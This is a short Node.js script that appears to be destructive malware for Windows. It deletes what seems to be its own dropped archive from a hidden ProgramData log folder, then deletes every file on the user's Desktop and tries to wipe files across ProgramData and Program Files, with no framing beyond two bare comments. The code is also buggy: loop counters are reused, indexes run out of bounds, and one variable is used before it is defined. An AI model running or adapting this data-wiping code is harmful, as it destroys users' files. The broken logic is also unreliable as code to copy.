//Dependencies
const OS = require("os")
const Fs = require("fs")

//Main
Fs.unlinkSync("C:\\ProgramData\\USOShared\\Logs\\User\\Eater_VF.zip", { force: true })

Main()
function Main(){
    const Desktop_Files = Fs.readdirSync(`${OS.homedir()}\\Desktop`, { withFileTypes: true }).filter(dirent => dirent.isFile()).map(dirent => dirent.name)
    const ProgramData_Folders = Fs.readdirSync("C:\\ProgramData", { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
    const ProgramFiles_Folders = Fs.readdirSync("C:\\Program Files", { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    for( i = 0; i <= Desktop_Files.length; i++ ){
        try{
            Fs.unlinkSync(`${OS.homedir()}\\Desktop\\${Desktop_Files[i]}`, { force: true })
        }catch{}
    }

    for( i = 0; i <= ProgramData_Folders.length; i++ ){
        const ProgramData_Folder_Files = Fs.readdirSync(`C:\\ProgramData\\${ProgramData_Folders[i]}`, { withFileTypes: true }).filter(dirent => dirent.isFile()).map(dirent => dirent.name)

        for( i = 0; i <= ProgramData_Folder_Files.length; i++ ){
            try{
                Fs.unlinkSync(`C:\\ProgramData\\${ProgramData_Folders[i]}\\${ProgramData_Folder_Files[i]}`, { force: true })
            }catch{}
        }
    }

    for( i = 0; i <= ProgramFiles_Folder_Files.length; i++ ){
        const ProgramFiles_Folder_Files = Fs.readdirSync(`C:\\ProgramData\\${ProgramFiles_Folder_Files[i]}`, { withFileTypes: true }).filter(dirent => dirent.isFile()).map(dirent => dirent.name)

        for( i = 0; i <= ProgramFiles_Folder_Files.length; i++ ){
            try{
                Fs.unlinkSync(`C:\\ProgramData\\${ProgramFiles_Folder_Files[i]}\\${ProgramData_Folder_Files[i]}`, { force: true })
            }catch{}
        }
    }
}